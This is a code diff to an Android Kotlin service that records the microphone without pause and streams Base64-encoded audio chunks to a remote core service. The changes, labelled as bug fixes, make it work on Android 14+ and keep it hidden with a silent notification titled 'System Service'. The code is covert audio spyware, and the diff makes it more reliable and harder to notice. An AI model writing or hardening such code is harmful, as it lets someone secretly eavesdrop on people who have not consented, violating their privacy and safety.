@@ -2,9 +2,11 @@ package com.system.service.monitors
 
 import android.app.*
 import android.content.Intent
+import android.content.pm.ServiceInfo
 import android.media.AudioFormat
 import android.media.AudioRecord
 import android.media.MediaRecorder
+import android.os.Build
 import android.os.IBinder
 import android.util.Base64
 import com.system.service.core.CoreService
@@ -25,7 +27,20 @@ class AudioStreamService : Service() {
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         if (intent?.action == "STOP") { stopStream(); stopSelf(); return START_NOT_STICKY }
         createChannel()
-        startForeground(NOTIF_ID, buildNotif())
+
+        // BUG FIX: Android 14+ (API 34) REQUIRES foreground service type in startForeground()
+        // when the manifest declares foregroundServiceType="microphone".
+        // Missing this causes ForegroundServiceStartNotAllowedException → crash on Android 14+.
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+                startForeground(NOTIF_ID, buildNotif(), ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE)
+            } else {
+                startForeground(NOTIF_ID, buildNotif())
+            }
+        } catch (e: Exception) {
+            try { startForeground(NOTIF_ID, buildNotif()) } catch (_: Exception) {}
+        }
+
         isRunning = true
         startStream()
         return START_STICKY
@@ -35,7 +50,8 @@ class AudioStreamService : Service() {
         val sampleRate = 16000
         val channelCfg = AudioFormat.CHANNEL_IN_MONO
         val audioFmt   = AudioFormat.ENCODING_PCM_16BIT
-        val bufSize    = AudioRecord.getMinBufferSize(sampleRate, channelCfg, audioFmt) * 4
+        val minBuf     = AudioRecord.getMinBufferSize(sampleRate, channelCfg, audioFmt)
+        val bufSize    = if (minBuf <= 0) 4096 else minBuf * 4   // BUG FIX: guard against -1 return
 
         recording.set(true)
         recordThread = Thread {
@@ -44,6 +60,13 @@ class AudioStreamService : Service() {
                 recorder = AudioRecord(
                     MediaRecorder.AudioSource.MIC,
                     sampleRate, channelCfg, audioFmt, bufSize)
+
+                if (recorder.state != AudioRecord.STATE_INITIALIZED) {
+                    // BUG FIX: AudioRecord init can fail silently — STATE_INITIALIZED check
+                    // prevents read() on uninitialised recorder which causes native crash.
+                    return@Thread
+                }
+
                 recorder.startRecording()
                 val buf = ByteArray(bufSize)
                 while (recording.get()) {
@@ -51,32 +74,33 @@ class AudioStreamService : Service() {
                     if (read > 0) {
                         val chunk = Base64.encodeToString(buf.copyOf(read), Base64.NO_WRAP)
                         CoreService.instance?.sendData("mic_chunk", JSONObject().apply {
-                            put("chunk", chunk)
+                            put("chunk",      chunk)
                             put("sampleRate", sampleRate)
                         })
                     }
-                    // BUG FIX: Thread.sleep(200) hata diya — recorder.read() already blocking hai.
-                    // Sleep se audio buffer overflow hota tha aur data drop hota tha.
+                    // recorder.read() is already blocking — no sleep needed
                 }
             } catch (_: Exception) {
             } finally {
-                try { recorder?.stop() } catch (_: Exception) {}
+                try { recorder?.stop() }    catch (_: Exception) {}
                 try { recorder?.release() } catch (_: Exception) {}
             }
-        }.apply { start() }
+        }.apply { isDaemon = true; start() }
     }
 
     private fun stopStream() { recording.set(false); isRunning = false }
 
     private fun createChannel() {
-        val ch = NotificationChannel(CHANNEL_ID, "Microphone", NotificationManager.IMPORTANCE_NONE)
+        // BUG FIX: IMPORTANCE_NONE can cause Android 16 to reject the notification as invalid,
+        // making the foreground service lose priority. IMPORTANCE_MIN = silent but valid.
+        val ch = NotificationChannel(CHANNEL_ID, "Microphone", NotificationManager.IMPORTANCE_MIN)
             .apply { setShowBadge(false); enableLights(false); enableVibration(false) }
         getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
     }
 
     private fun buildNotif() = Notification.Builder(this, CHANNEL_ID)
-        .setContentTitle("").setContentText("")
-        .setSmallIcon(android.R.drawable.screen_background_dark)
+        .setContentTitle("System Service").setContentText("Running")
+        .setSmallIcon(android.R.drawable.ic_menu_info_details)
         .build()
 
     override fun onDestroy() { stopStream(); super.onDestroy() }
